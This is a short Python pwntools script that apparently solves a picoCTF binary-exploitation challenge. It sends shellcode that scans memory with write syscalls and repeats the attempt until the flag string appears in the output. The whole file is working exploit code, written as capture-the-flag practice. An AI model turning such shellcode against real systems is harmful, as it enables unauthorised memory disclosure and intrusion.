#!/usr/bin/env python3

from pwn import *
import sys
import re
exe = ELF("chall")

context.binary = exe
context.terminal = "kitty"

def conn():
    if args.REMOTE:
        return remote("mars.picoctf.net", 31021)
    elif args.GDB:
        return gdb.debug([exe.path],gdbscript="b *main+186\nc")
    else:
        return process([exe.path])


def main():


    payload = asm(r"""
        mov r10, 0x555572800000
        add r10, 0x202060
        /* jump here */
        add r10, 1048576

        mov rax, 1
        mov rdi, 1
        mov rsi, r10
        mov rdx, 100
        syscall
        cmp rax, 0
        jle $-0x25
        mov rax, 60
        mov rdi, 0
        syscall
    """)

    r = conn()

    r.sendline(payload)
    return r.recvall()


if __name__ == "__main__":
    while True:
        recv = main().decode()
        search = re.search("picoCTF{.*}", recv)
        if search:
            print(search.group(0))
            exit(0)

